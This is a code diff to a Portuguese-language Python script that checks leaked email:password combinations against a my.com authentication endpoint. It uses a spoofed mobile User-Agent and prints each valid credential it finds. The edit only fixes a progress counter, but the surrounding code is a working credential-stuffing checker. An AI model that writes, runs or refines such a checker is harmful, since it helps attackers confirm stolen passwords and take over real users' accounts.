@@ -64,7 +64,7 @@ def checker(email, senha, c, ldb):
     acesso=requests.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+email+'&Password='+senha, headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
     if ('Ok=1') in acesso:
         print('Credenciais válidas: '+combo)
-        print('E-mails verificados: '+c+', e-mails restantes: '+str(ldb-c))
+        print('E-mails verificados: '+str(c)+', e-mails restantes: '+str(ldb-c))
 c=0        
 for combo in db:
   if (':') in combo:
